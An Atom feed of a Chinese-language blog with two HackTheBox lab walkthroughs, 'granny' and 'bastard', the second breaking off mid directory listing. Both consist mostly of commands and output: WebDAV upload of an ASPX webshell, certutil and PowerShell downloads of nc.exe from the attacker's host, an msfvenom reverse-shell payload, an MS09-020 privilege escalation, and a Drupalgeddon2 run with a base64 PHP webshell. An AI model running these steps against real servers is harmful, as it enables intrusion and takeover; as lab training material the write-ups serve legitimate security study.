<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://V-alkoinen.github.io</id>
    <title>老白</title>
    <updated>2022-04-27T12:27:52.517Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://V-alkoinen.github.io"/>
    <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
    <logo>https://V-alkoinen.github.io/images/avatar.png</logo>
    <icon>https://V-alkoinen.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, 老白</rights>
    <entry>
        <title type="html"><![CDATA[HackTheBox-granny]]></title>
        <id>https://V-alkoinen.github.io/post/hackthebox-granny/</id>
        <link href="https://V-alkoinen.github.io/post/hackthebox-granny/">
        </link>
        <updated>2022-04-27T12:21:41.000Z</updated>
        <content type="html"><![CDATA[<p>10.129.95.234</p>
<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2022-04-27 16:46 CST
Nmap scan report for 10.129.95.234
Host is up (0.0028s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unkown
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Wed, 27 Apr 2022 08:46:50 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|2000|XP (88%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (88%), Microsoft Windows Server 2003 SP2 (88%), Microsoft Windows Server 2008 Enterprise SP2 (88%), Microsoft Windows 2003 SP2 (87%), Microsoft Windows 2000 SP4 (86%), Microsoft Windows XP (86%), Microsoft Windows XP SP3 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.70 ms 10.10.14.1
2   2.92 ms 10.129.95.234

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.31 seconds

</code></pre>
<p>看到可以PUT，尝试PUT shell</p>
<pre><code>root@Ali-SG /laobai/granny 
╰─# cp /usr/share/webshells/aspx/cmdasp.aspx .
╭─root@Ali-SG /laobai/granny 
╰─# curl -X PUT http://10.129.95.234/laobai.txt --upload-file ./cmdasp.aspx                       
╭─root@Ali-SG /laobai/granny 
╰─# curl -X MOVE -H &quot;Destination:http://10.129.95.234/laobai.aspx&quot; http://10.129.95.234/laobai.txt

</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1651062334716.png" alt="" loading="lazy"></figure>
<p>搞个交互式shell</p>
<p>certutil.exe -urlcache -split -f http://10.10.14.6:9998/nc.exe nc.exe</p>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1651062356921.png" alt="" loading="lazy"></figure>
<p>无果</p>
<p>powershell (new-object Net.WebClient).DownloadFile('http://10.10.14.6:9998/nc.exe','c:\windows\system32\inetsrv\nc.exe')</p>
<p>同无果</p>
<figure data-type="image" tabindex="3"><img src="https://V-alkoinen.github.io/post-images/1651062379099.png" alt="" loading="lazy"></figure>
<p>systeminfo看了下，server 03 可能是因为版本原因</p>
<p>使用msfvenom生成马，用curl传上去</p>
<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4443 -f aspx &gt; laobai1.aspx                                                                                       2 ↵
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2748 bytes
╭─root@Ali-SG ~ 
╰─# curl -X PUT http://10.129.95.234/laobai1.txt --upload-file ./laobai1.aspx                
╭─root@Ali-SG ~ 
╰─# curl -X MOVE -H &quot;Destination:http://10.129.95.234/laobai1.aspx&quot; http://10.129.95.234/laobai1.txt
╭─root@Ali-SG ~ 
╰─# nc -nvlp 4443              
listening on [any] 4443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.95.234] 1085
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of c:\windows\system32\inetsrv

04/26/2022  06:08 PM    &lt;DIR&gt;          .
04/26/2022  06:08 PM    &lt;DIR&gt;          ..
02/18/2007  03:00 PM            58,880 ADROT.dll
02/18/2007  03:00 PM           291,328 adsiis.dll
04/12/2017  10:22 PM    &lt;DIR&gt;          ASP Compiled Templates
02/18/2007  03:00 PM           388,096 asp.dll
02/18/2007  03:00 PM            27,478 asp.mfl
02/18/2007  03:00 PM            21,302 asp.mof
02/18/2007  03:00 PM            47,104 browscap.dll
02/18/2007  03:00 PM            32,423 browscap.ini
02/18/2007  03:00 PM           102,400 CertMap.ocx
02/18/2007  03:00 PM            82,432 certobj.dll
02/18/2007  03:00 PM           297,984 CertWiz.ocx
02/21/2003  06:48 PM             1,844 clusweb.vbs
02/18/2007  03:00 PM            77,824 Cnfgprts.ocx
02/18/2007  03:00 PM            64,000 coadmin.dll
02/18/2007  03:00 PM            33,792 ContRot.dll
02/18/2007  03:00 PM            27,136 davcdata.exe
02/18/2007  03:00 PM             6,656 davcprox.dll
02/18/2007  03:00 PM            25,600 gzip.dll
04/26/2022  06:08 PM    &lt;DIR&gt;          History
02/18/2007  03:00 PM           241,664 httpext.dll
02/18/2007  03:00 PM            18,944 httpmib.dll
02/18/2007  03:00 PM            48,640 httpodbc.dll
04/12/2017  05:17 PM            48,993 iis.msc
02/18/2007  03:00 PM            21,504 iisadmin.dll
02/18/2007  03:00 PM            21,582 iisadmin.mfl
02/18/2007  03:00 PM            12,934 iisadmin.mof
04/12/2017  05:16 PM    &lt;DIR&gt;          iisadmpwd
02/18/2007  03:00 PM         1,133,056 iiscfg.dll
02/18/2007  03:00 PM            62,976 iisclex4.dll
02/18/2007  03:00 PM            82,944 iisext.dll
02/18/2007  03:00 PM            76,288 iislog.dll
02/18/2007  03:00 PM           122,880 iisres.dll
02/18/2007  03:00 PM            28,160 iisrstas.exe
02/18/2007  03:00 PM           217,088 iisui.dll
02/18/2007  03:00 PM            68,608 iisuiobj.dll
02/18/2007  03:00 PM           167,936 iisutil.dll
02/18/2007  03:00 PM           216,576 iisw3adm.dll
02/18/2007  03:00 PM           194,560 iiswmi.dll
02/21/2003  06:48 PM                48 iis_switch.bat
02/21/2003  06:48 PM             9,709 iis_switch.vbs
02/18/2007  03:00 PM            14,336 inetinfo.exe
02/18/2007  03:00 PM         1,058,304 inetmgr.dll
02/18/2007  03:00 PM            19,456 inetmgr.exe
02/18/2007  03:00 PM           235,520 infocomm.dll
02/18/2007  03:00 PM             8,192 isapips.dll
02/18/2007  03:00 PM            52,736 isatq.dll
02/18/2007  03:00 PM            19,456 iscomlog.dll
02/18/2007  03:00 PM            25,600 logscrpt.dll
02/18/2007  03:00 PM               326 logtemp.sql
02/18/2007  03:00 PM            67,584 logui.ocx
02/18/2007  03:00 PM            13,312 lonsint.dll
04/12/2017  05:17 PM           813,332 MBSchema.bin.00000000h
04/12/2017  05:17 PM           263,671 MBSchema.xml
04/12/2017  05:17 PM    &lt;DIR&gt;          MetaBack
04/26/2022  06:08 PM            43,604 MetaBase.xml
02/18/2007  03:00 PM           234,496 metadata.dll
02/18/2007  03:00 PM            61,440 NEXTLINK.dll
02/18/2007  03:00 PM           187,392 nntpadm.dll
02/18/2007  03:00 PM         2,663,424 nntpsnap.dll
02/18/2007  03:00 PM             4,096 rpcref.dll
02/18/2007  03:00 PM           219,136 seo.dll
02/18/2007  03:00 PM           179,200 smtpadm.dll
02/18/2007  03:00 PM         2,086,400 smtpsnap.dll
02/18/2007  03:00 PM            24,064 ssinc.dll
02/18/2007  03:00 PM            44,544 svcext.dll
02/18/2007  03:00 PM           114,176 uihelper.dll
02/18/2007  03:00 PM            15,360 urlauth.dll
02/18/2007  03:00 PM            19,456 w3cache.dll
02/18/2007  03:00 PM            10,752 w3comlog.dll
02/18/2007  03:00 PM           349,696 w3core.dll
02/18/2007  03:00 PM            96,808 w3core.mfl
02/18/2007  03:00 PM            74,002 w3core.mof
02/18/2007  03:00 PM             6,144 w3ctrlps.dll
02/18/2007  03:00 PM            24,064 w3ctrs.dll
02/18/2007  03:00 PM            39,424 w3dt.dll
02/18/2007  03:00 PM             5,706 w3dt.mfl
02/18/2007  03:00 PM             6,238 w3dt.mof
02/18/2007  03:00 PM            92,672 w3ext.dll
02/18/2007  03:00 PM            62,464 w3isapi.dll
02/18/2007  03:00 PM             2,738 w3isapi.mfl
02/18/2007  03:00 PM             2,446 w3isapi.mof
02/18/2007  03:00 PM            13,312 w3tp.dll
02/18/2007  03:00 PM             7,168 w3wp.exe
02/18/2007  03:00 PM            23,040 wam.dll
02/18/2007  03:00 PM             6,656 wamps.dll
02/18/2007  03:00 PM            55,808 wamreg.dll
              82 File(s)     13,749,120 bytes
               6 Dir(s)   1,384,402,944 bytes free

c:\windows\system32\inetsrv&gt;whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv&gt;systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 19 Hours, 3 Minutes, 17 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 734 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,286 MB
Page File: In Use:         184 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

</code></pre>
<p>查找可用exp</p>
<pre><code>╭─root@Ali-SG /laobai/granny 
╰─# python2 windows-exploit-suggester.py --update                                                                                                                                  1 ↵
[*] initiating winsploit version 3.3...
[+] writing to file 2022-04-27-mssb.xls
[*] done
╭─root@Ali-SG /laobai/granny 
╰─# python2 windows-exploit-suggester.py --database 2022-04-27-mssb.xls --systeminfo 1.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*] 
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*] 
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done

</code></pre>
<p>最后采用ms09-020</p>
<pre><code>wget https://github.com/Al1ex/WindowsElevation/raw/master/CVE-2009-1535/MS09-020-KB970483-CVE-2009-1535-IIS6.zip
--2022-04-27 20:02:16--  https://github.com/Al1ex/WindowsElevation/raw/master/CVE-2009-1535/MS09-020-KB970483-CVE-2009-1535-IIS6.zip
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/Al1ex/WindowsElevation/master/CVE-2009-1535/MS09-020-KB970483-CVE-2009-1535-IIS6.zip [following]
--2022-04-27 20:02:16--  https://raw.githubusercontent.com/Al1ex/WindowsElevation/master/CVE-2009-1535/MS09-020-KB970483-CVE-2009-1535-IIS6.zip
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 205979 (201K) [application/zip]
Saving to: ‘MS09-020-KB970483-CVE-2009-1535-IIS6.zip’

MS09-020-KB970483-CVE-2009-1535-IIS6.zip      100%[================================================================================================&gt;] 201.15K  --.-KB/s    in 0.004s  

2022-04-27 20:02:17 (44.8 MB/s) - ‘MS09-020-KB970483-CVE-2009-1535-IIS6.zip’ saved [205979/205979]

╭─root@Ali-SG /laobai/granny 
╰─# unzip MS09-020-KB970483-CVE-2009-1535-IIS6.zip 
Archive:  MS09-020-KB970483-CVE-2009-1535-IIS6.zip
   creating: MS09-020-KB970483-CVE-2009-1535-IIS6/
  inflating: MS09-020-KB970483-CVE-2009-1535-IIS6/IIS6.0.exe

╭─root@Ali-SG /laobai/granny/MS09-020-KB970483-CVE-2009-1535-IIS6 
╰─# curl -X PUT http://10.129.95.234/ms09-020.txt --upload-file ./IIS6.0.exe                

╭─root@Ali-SG /laobai/granny/MS09-020-KB970483-CVE-2009-1535-IIS6 
╰─# curl -X MOVE -H &quot;Destination:http://10.129.95.234/ms09-020.exe&quot; http://10.129.95.234/ms09-020.txt
</code></pre>
<pre><code>C:\Inetpub\wwwroot&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\Inetpub\wwwroot

04/27/2022  03:03 PM    &lt;DIR&gt;          .
04/27/2022  03:03 PM    &lt;DIR&gt;          ..
04/27/2022  02:58 PM               253 110.asp
04/27/2022  03:01 PM               448 1100.asp
04/12/2017  05:17 PM    &lt;DIR&gt;          aspnet_client
04/26/2022  06:06 PM             1,400 cmdasp.aspx
02/21/2003  06:48 PM             1,433 iisstart.htm
04/12/2017  05:17 PM    &lt;DIR&gt;          images
04/27/2022  11:51 AM             1,400 laobai.aspx
04/27/2022  01:06 PM             2,748 laobai1.aspx
04/27/2022  03:03 PM           211,716 ms09-020.exe
04/27/2022  02:52 PM               253 ms10-059.exe
04/27/2022  02:15 PM         4,415,148 ms14-040.exe
04/27/2022  02:11 PM            11,776 ms14-058.exe
04/27/2022  02:05 PM               162 ms14-070.exe
04/27/2022  02:02 PM           135,680 ms15-010.exe
04/27/2022  01:58 PM            48,128 ms15-051.exe
04/27/2022  12:59 PM                35 nahjxo.jsp
04/27/2022  01:51 PM            38,616 nc.exe
04/27/2022  12:59 PM                 6 nwoqgz.txt
02/21/2003  06:48 PM             2,806 pagerror.gif
04/12/2017  05:17 PM             2,440 postinfo.html
04/27/2022  12:14 PM                35 qzjxlz.jsp
04/27/2022  12:14 PM                 6 rmhyhe.txt
04/12/2017  05:17 PM    &lt;DIR&gt;          _private
04/12/2017  05:17 PM             1,754 _vti_inf.html
04/12/2017  05:17 PM    &lt;DIR&gt;          _vti_log
              21 File(s)      4,876,243 bytes
               6 Dir(s)   1,378,660,352 bytes free

C:\Inetpub\wwwroot&gt;ms09-020.exe &quot;whoami&quot;
ms09-020.exe &quot;whoami&quot;
nt authority\system
-------------------------------------------
kindle--&gt;Got WMI process Pid: 1960 
begin to try
kindle--&gt;Found token SYSTEM 
kindle--&gt;Command:whoami

</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[HackTheBox-bastard]]></title>
        <id>https://V-alkoinen.github.io/post/hackthebox-bastard/</id>
        <link href="https://V-alkoinen.github.io/post/hackthebox-bastard/">
        </link>
        <updated>2022-04-26T13:32:09.000Z</updated>
        <content type="html"><![CDATA[<p>nmap -A -T4  10.129.128.194</p>
<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2022-04-26 18:55 CST
Nmap scan report for 10.129.128.194
Host is up (0.0033s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.95 ms 10.10.14.1
2   3.23 ms 10.129.128.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.81 seconds

</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650980049605.png" alt="" loading="lazy"><br>
curl https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/drupalgeddon2.rb -o exp4.rb</p>
<p>chmod +x exp4.rb</p>
<p>./exp4.rb  'http://10.129.128.194/' -v '7'</p>
<pre><code>[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.129.128.194/
--------------------------------------------------------------------------------
[+] Found  : http://10.129.128.194/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo GJCTTNMC
[+] Result : GJCTTNMC
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.129.128.194/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.129.128.194/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.129.128.194/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2&gt;&gt; whoami
nt authority\iusr
drupalgeddon2&gt;&gt; net user 

drupalgeddon2&gt;&gt; dir
Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\inetpub\drupal-7.54

26/04/2022  02:14 ££    &lt;DIR&gt;          .
26/04/2022  02:14 ££    &lt;DIR&gt;          ..
19/03/2017  01:42 ££               317 .editorconfig
19/03/2017  01:42 ££               174 .gitignore
19/03/2017  01:42 ££             5.969 .htaccess
19/03/2017  01:42 ££             6.604 authorize.php
19/03/2017  01:42 ££           110.781 CHANGELOG.txt
19/03/2017  01:42 ££             1.481 COPYRIGHT.txt
19/03/2017  01:42 ££               720 cron.php
19/03/2017  01:43 ££    &lt;DIR&gt;          includes
19/03/2017  01:42 ££               529 index.php
19/03/2017  01:42 ££             1.717 INSTALL.mysql.txt
19/03/2017  01:42 ££             1.874 INSTALL.pgsql.txt
19/03/2017  01:42 ££               703 install.php
19/03/2017  01:42 ££             1.298 INSTALL.sqlite.txt
19/03/2017  01:42 ££            17.995 INSTALL.txt
19/03/2017  01:42 ££            18.092 LICENSE.txt
19/03/2017  01:42 ££             8.710 MAINTAINERS.txt
19/03/2017  01:43 ££    &lt;DIR&gt;          misc
19/03/2017  01:43 ££    &lt;DIR&gt;          modules
26/04/2022  02:14 ££           784.384 MS10-059.exe
26/04/2022  02:04 ££            43.696 nc64.exe
19/03/2017  01:43 ££    &lt;DIR&gt;          profiles
19/03/2017  01:42 ££             5.382 README.txt
19/03/2017  01:42 ££             2.189 robots.txt
